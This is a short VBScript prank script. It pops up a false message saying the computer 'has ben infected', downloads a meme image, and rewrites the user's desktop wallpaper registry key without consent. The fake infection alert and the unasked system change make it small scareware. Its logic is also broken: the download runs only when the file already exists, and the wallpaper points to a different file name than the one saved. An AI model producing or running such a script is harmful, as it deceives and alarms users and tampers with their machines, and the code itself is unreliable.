x=MsgBox("Ur PC has ben infected by Ayy Lmaos",64+0+4096,"Ur fucked")
Sub HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
        WScript.Echo "ERROR: Target folder not found."
        Exit Sub
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Sub
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
If FSO.FileExists("C:\Users\Public\ayylmao.jpg") Then
FSO.DeleteFile "C:\Users\Public\ayylmao.jpg" 
HTTPDownload "http://i3.kym-cdn.com/photos/images/facebook/000/632/652/6ca.jpg", "C:\Users\Public\ayylmao.jpg"
strValue = "C:\Users\Public\ayylmaobg.jpg"
sleepTime = 150
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = WScript.CreateObject("Wscript.Shell") 
WScript.Sleep sleepTime
WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "memes"
WScript.Sleep sleepTime
WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strValue
wshShell.run "cmd /c RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters", 1, True
Set WshShell = Nothing
End If
